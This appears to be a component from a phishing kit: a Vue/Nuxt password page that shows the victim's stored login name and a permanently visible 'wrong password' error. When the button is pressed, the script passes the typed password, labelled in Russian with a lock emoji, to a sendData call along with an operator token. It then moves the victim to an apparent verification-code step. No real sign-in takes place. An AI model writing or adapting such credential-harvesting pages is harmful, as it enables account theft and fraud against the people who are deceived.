<template>
  <div class="panel__body" id="first">
    <div class="panel__title">
      <h1>{{ t('password.title') }}</h1>
      <div class="panel__text">
        {{ t('password.under_title.1') }} <strong id="forLoginName">{{ login }}</strong>
      </div>
    </div>
    <div class="spacer"></div>
    <div class="form">
      <div class="input__wrapper">
        <label for="loginname">{{ t('password.input_title') }}</label>
        <div class="input__box">
          <input :type="visibilityOff ? `password` : `text`" name="loginname" class="incorrect-pass-input" id="loginname" :placeholder="placeholder" v-model="value"
                 minlength="3">
          <div id="togglePassword" @click="visibilityOff = !visibilityOff">
                    <span id="togglePassIcon" class="material-symbols-outlined">
                        {{ visibilityOff ? `visibility` : `visibility_off` }}
                    </span>
          </div>
        </div>
        <div class="errorMessage errorMessageNotValid" style="display: none">Please enter your username
        </div>
        <div class="errorMessage errorMessageWrong" style="display: block">{{ t('password.errorMessage') }} </div>
      </div>
      <div class="button__wrapper">
        <button id="firstBtn" class="btn" @click="nextPage" :disabled="value.length <= 0">{{ t('password.button_title') }}</button>
      </div>
      <div class="text-partner">
        <hr>
        {{ t("sign_in.questions.1") }}
        <br>
        {{ t("sign_in.questions.2") }}
      </div>
    </div>
  </div>
</template>

<script setup>
import {sendData} from "~/utils/";
import {useI18n} from "vue-i18n";
const { t } = useI18n()

const placeholder = computed(() => t('password.placeholder'))
const value = ref("")

const visibilityOff = ref(true)

const router = useRouter()
const route = useRoute()

const login = ref()

async function nextPage() {
  await router.push({
    name: "verif-pick",
    query: {op_token: route.query.op_token,}
  })
  await sendData({"🔒 Пароль": value.value}, route.query.op_token)
}

onNuxtReady(() => {
  login.value = localStorage.getItem("login")
})

</script>

<style>
.incorrect-pass-input {
  border: 1px solid #d4111e
}

.incorrect-pass-input:focus {
  border: 2px solid #596dd1
}

.attention {
  display: block;
  top:5px
}
.incorrect-pass-input:focus + .attention {
  display: none;
}
</style>